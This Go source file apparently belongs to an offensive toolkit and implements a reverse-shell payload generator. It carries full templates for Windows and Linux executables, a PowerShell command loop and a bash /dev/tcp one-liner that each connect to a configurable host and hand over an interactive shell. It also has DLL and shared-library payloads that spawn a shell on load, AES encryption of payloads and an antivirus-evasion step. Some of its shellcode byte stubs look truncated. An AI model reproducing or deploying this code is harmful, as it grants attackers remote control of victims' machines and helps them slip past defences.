package system

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"errors"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"runtime"
	"text/template"

	"github.com/0xvyper/mihra/core/security"
)

type PayloadType int
type Protocol int

const (
	TCP Protocol = iota

	UDP

	HTTP

	HTTPS

	DNS
)
const (
	ShellcodePayload PayloadType = iota

	ExecutablePayload

	ScriptPayload

	DLLPayload
)

type PayloadFormat int

const (
	RawFormat PayloadFormat = iota

	HexFormat

	Base64Format

	CFormat

	PythonFormat

	PowerShellFormat
)

type PayloadConfig struct {
	Type           PayloadType
	Format         PayloadFormat
	Host           string
	Port           int
	Protocol       Protocol
	Secure         bool
	Staged         bool
	Architecture   string
	Platform       string
	Obfuscate      bool
	SecurityConfig *security.SecurityManager
}

func DefaultPayloadConfig() *PayloadConfig {
	return &PayloadConfig{
		Type:         ShellcodePayload,
		Format:       RawFormat,
		Host:         "127.0.0.1",
		Port:         4444,
		Protocol:     TCP,
		Secure:       false,
		Staged:       false,
		Architecture: "x64",
		Platform:     runtime.GOOS,
		Obfuscate:    true,
	}
}

type PayloadGenerator struct {
	Config     *PayloadConfig
	secManager *security.SecurityManager
	templates  map[string]*template.Template
}

func NewPayloadGenerator(config *PayloadConfig) *PayloadGenerator {

	if config == nil {
		config = DefaultPayloadConfig()
	}

	var secManager *security.SecurityManager
	if config.SecurityConfig != nil {
		secManager = config.SecurityConfig
	} else {
		secManager = security.NewSecurityManager()
	}
	return &PayloadGenerator{
		Config:     config,
		secManager: secManager,
		templates:  make(map[string]*template.Template),
	}
}
func (p *PayloadGenerator) GeneratePayload() ([]byte, error) {
	var payload []byte
	var err error

	switch p.Config.Type {
	case ShellcodePayload:
		payload, err = p.generateShellcodePayload()
	case ExecutablePayload:
		payload, err = p.generateExecutablePayload()
	case ScriptPayload:
		payload, err = p.generateScriptPayload()
	case DLLPayload:
		payload, err = p.generateDLLPayload()
	default:
		return nil, errors.New("unsupported payload type")
	}
	if err != nil {
		return nil, err
	}

	if p.Config.Obfuscate && p.secManager != nil {
		payload, err = security.NewAntiVirusEvasion().DeobfuscateSignature(payload, byte(123))
		if err != nil {
			return nil, fmt.Errorf("failed to obfuscate payload: %v", err)
		}
	}

	return p.formatPayload(payload)
}
func (p *PayloadGenerator) generateShellcodePayload() ([]byte, error) {

	if p.Config.Platform == "windows" {
		if p.Config.Architecture == "x64" {

			return []byte{0x48, 0x31, 0xC0, 0x48, 0x89, 0xC2, 0x48, 0x89, 0xC6, 0x48, 0x8D, 0x3D}, nil
		} else {

			return []byte{0x31, 0xC0, 0x31, 0xDB, 0x31, 0xC9, 0x31, 0xD2, 0xB0, 0x01}, nil
		}
	} else {
		if p.Config.Architecture == "x64" {

			return []byte{0x6A, 0x29, 0x58, 0x99, 0x6A, 0x02, 0x5F, 0x6A, 0x01, 0x5E, 0x0F, 0x05}, nil
		} else {

			return []byte{0x31, 0xC0, 0x31, 0xDB, 0x31, 0xC9, 0x31, 0xD2, 0xB0, 0x66, 0xB3, 0x01}, nil
		}
	}
}
func (p *PayloadGenerator) generateExecutablePayload() ([]byte, error) {

	var templateName string
	if p.Config.Platform == "windows" {
		templateName = "windows_executable"
	} else {
		templateName = "linux_executable"
	}

	tmpl, err := p.getTemplate(templateName)
	if err != nil {
		return nil, err
	}

	var buf bytes.Buffer

	err = tmpl.Execute(&buf, map[string]interface{}{
		"Host":     p.Config.Host,
		"Port":     p.Config.Port,
		"Protocol": p.Config.Protocol,
		"Secure":   p.Config.Secure,
	})
	if err != nil {
		return nil, fmt.Errorf("failed to execute template: %v", err)
	}
	return buf.Bytes(), nil
}
func (p *PayloadGenerator) generateScriptPayload() ([]byte, error) {

	var templateName string
	if p.Config.Platform == "windows" {
		templateName = "windows_script"
	} else {
		templateName = "linux_script"
	}

	tmpl, err := p.getTemplate(templateName)
	if err != nil {
		return nil, err
	}

	var buf bytes.Buffer

	err = tmpl.Execute(&buf, map[string]interface{}{
		"Host":     p.Config.Host,
		"Port":     p.Config.Port,
		"Protocol": p.Config.Protocol,
		"Secure":   p.Config.Secure,
	})
	if err != nil {
		return nil, fmt.Errorf("failed to execute template: %v", err)
	}
	return buf.Bytes(), nil
}
func (p *PayloadGenerator) generateDLLPayload() ([]byte, error) {

	var templateName string
	if p.Config.Platform == "windows" {
		templateName = "windows_dll"
	} else {
		templateName = "linux_shared_library"
	}

	tmpl, err := p.getTemplate(templateName)
	if err != nil {
		return nil, err
	}

	var buf bytes.Buffer

	err = tmpl.Execute(&buf, map[string]interface{}{
		"Host":     p.Config.Host,
		"Port":     p.Config.Port,
		"Protocol": p.Config.Protocol,
		"Secure":   p.Config.Secure,
	})
	if err != nil {
		return nil, fmt.Errorf("failed to execute template: %v", err)
	}
	return buf.Bytes(), nil
}
func (p *PayloadGenerator) formatPayload(payload []byte) ([]byte, error) {
	switch p.Config.Format {
	case RawFormat:
		return payload, nil
	case HexFormat:
		return []byte(hex.EncodeToString(payload)), nil
	case Base64Format:
		return []byte(base64.StdEncoding.EncodeToString(payload)), nil
	case CFormat:
		return p.formatCArray(payload), nil
	case PythonFormat:
		return p.formatPythonBytes(payload), nil
	case PowerShellFormat:
		return p.formatPowerShellBytes(payload), nil
	default:
		return nil, errors.New("unsupported payload format")
	}
}
func (p *PayloadGenerator) formatCArray(payload []byte) []byte {
	var buf bytes.Buffer
	buf.WriteString("unsigned char buf[] = {\n")
	for i, b := range payload {
		if i > 0 {
			buf.WriteString(", ")
		}
		if i%16 == 0 && i > 0 {
			buf.WriteString("\n")
		}
		buf.WriteString(fmt.Sprintf("0x%02x", b))
	}
	buf.WriteString("\n};\n")
	return buf.Bytes()
}
func (p *PayloadGenerator) formatPythonBytes(payload []byte) []byte {
	var buf bytes.Buffer
	buf.WriteString("buf = b\"")
	for _, b := range payload {
		buf.WriteString(fmt.Sprintf("\\x%02x", b))
	}
	buf.WriteString("\"")
	return buf.Bytes()
}
func (p *PayloadGenerator) formatPowerShellBytes(payload []byte) []byte {
	var buf bytes.Buffer
	buf.WriteString("[Byte[]] $buf = ")
	for i, b := range payload {
		if i > 0 {
			buf.WriteString(",")
		}
		if i%16 == 0 && i > 0 {
			buf.WriteString("\n")
		}
		buf.WriteString(fmt.Sprintf("0x%02x", b))
	}
	return buf.Bytes()
}
func (p *PayloadGenerator) getTemplate(name string) (*template.Template, error) {

	if tmpl, ok := p.templates[name]; ok {
		return tmpl, nil
	}

	var templateContent string
	switch name {
	case "windows_executable":
		templateContent = windowsExecutableTemplate
	case "linux_executable":
		templateContent = linuxExecutableTemplate
	case "windows_script":
		templateContent = windowsScriptTemplate
	case "linux_script":
		templateContent = linuxScriptTemplate
	case "windows_dll":
		templateContent = windowsDLLTemplate
	case "linux_shared_library":
		templateContent = linuxSharedLibraryTemplate
	default:
		return nil, fmt.Errorf("template not found: %s", name)
	}

	tmpl, err := template.New(name).Parse(templateContent)
	if err != nil {
		return nil, fmt.Errorf("failed to parse template: %v", err)
	}

	p.templates[name] = tmpl
	return tmpl, nil
}
func (p *PayloadGenerator) SavePayload(payload []byte, filePath string) error {

	dir := filepath.Dir(filePath)
	if dir != "" && dir != "." {
		if err := os.MkdirAll(dir, 0755); err != nil {
			return fmt.Errorf("failed to create directory: %v", err)
		}
	}

	if err := os.WriteFile(filePath, payload, 0644); err != nil {
		return fmt.Errorf("failed to write payload to file: %v", err)
	}
	return nil
}
func (p *PayloadGenerator) EncryptPayload(payload []byte, password string) ([]byte, error) {

	key := deriveKey(password)

	return encryptAES(payload, key)
}
func (p *PayloadGenerator) DecryptPayload(encryptedPayload []byte, password string) ([]byte, error) {

	key := deriveKey(password)

	return decryptAES(encryptedPayload, key)
}
func deriveKey(password string) []byte {

	hash := sha256.Sum256([]byte(password))
	return hash[:]
}
func encryptAES(plaintext, key []byte) ([]byte, error) {

	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, err
	}

	ciphertext := gcm.Seal(nonce, nonce, plaintext, nil)
	return ciphertext, nil
}
func decryptAES(ciphertext, key []byte) ([]byte, error) {

	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	nonceSize := gcm.NonceSize()
	if len(ciphertext) < nonceSize {
		return nil, errors.New("ciphertext too short")
	}

	nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]

	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return nil, err
	}
	return plaintext, nil
}

const windowsExecutableTemplate = `
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <stdio.h>
#pragma comment(lib, "ws2_32.lib")
int main() {
    
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    
    WSADATA wsaData;
    int result = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (result != 0) {
        return 1;
    }
    
    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        WSACleanup();
        return 1;
    }
    
    struct sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons({{.Port}});
    inet_pton(AF_INET, "{{.Host}}", &serverAddr.sin_addr);
    result = connect(sock, (struct sockaddr*)&serverAddr, sizeof(serverAddr));
    if (result == SOCKET_ERROR) {
        closesocket(sock);
        WSACleanup();
        return 1;
    }
    
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = (HANDLE)sock;
    si.hStdOutput = (HANDLE)sock;
    si.hStdError = (HANDLE)sock;
    
    CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
    
    WaitForSingleObject(pi.hProcess, INFINITE);
    
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    closesocket(sock);
    WSACleanup();
    return 0;
}
`
const linuxExecutableTemplate = `
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <arpa/inet.h>
int main() {
    
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        return 1;
    }
    
    struct sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons({{.Port}});
    inet_pton(AF_INET, "{{.Host}}", &serverAddr.sin_addr);
    if (connect(sock, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) < 0) {
        close(sock);
        return 1;
    }
    
    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);
    
    execl("/bin/sh", "sh", "-i", NULL);
    
    close(sock);
    return 0;
}
`
const windowsScriptTemplate = `
# Windows PowerShell script template
# Host: {{.Host}}
# Port: {{.Port}}
# Protocol: {{.Protocol}}
# Secure: {{.Secure}}
$client = New-Object System.Net.Sockets.TCPClient("{{.Host}}", {{.Port}})
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
    $sendback = (iex $data 2>&1 | Out-String)
    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte, 0, $sendbyte.Length)
    $stream.Flush()
}
$client.Close()
`
const linuxScriptTemplate = `
#!/bin/bash
# Linux bash script template
# Host: {{.Host}}
# Port: {{.Port}}
# Protocol: {{.Protocol}}
# Secure: {{.Secure}}
bash -i >& /dev/tcp/{{.Host}}/{{.Port}} 0>&1
`
const windowsDLLTemplate = `
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#pragma comment(lib, "ws2_32.lib")
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ConnectBack, NULL, 0, NULL);
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
DWORD WINAPI ConnectBack(LPVOID lpParameter) {
    
    WSADATA wsaData;
    int result = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (result != 0) {
        return 1;
    }
    
    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        WSACleanup();
        return 1;
    }
    
    struct sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons({{.Port}});
    inet_pton(AF_INET, "{{.Host}}", &serverAddr.sin_addr);
    result = connect(sock, (struct sockaddr*)&serverAddr, sizeof(serverAddr));
    if (result == SOCKET_ERROR) {
        closesocket(sock);
        WSACleanup();
        return 1;
    }
    
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = (HANDLE)sock;
    si.hStdOutput = (HANDLE)sock;
    si.hStdError = (HANDLE)sock;
    
    CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
    
    WaitForSingleObject(pi.hProcess, INFINITE);
    
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    closesocket(sock);
    WSACleanup();
    return 0;
}
`
const linuxSharedLibraryTemplate = `
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <pthread.h>
void* connect_back(void* arg) {
    
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        return NULL;
    }
    
    struct sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons({{.Port}});
    inet_pton(AF_INET, "{{.Host}}", &serverAddr.sin_addr);
    if (connect(sock, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) < 0) {
        close(sock);
        return NULL;
    }
    
    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);
    
    execl("/bin/sh", "sh", "-i", NULL);
    
    close(sock);
    return NULL;
}
__attribute__((constructor))
void init() {
    pthread_t thread;
    pthread_create(&thread, NULL, connect_back, NULL);
}
`
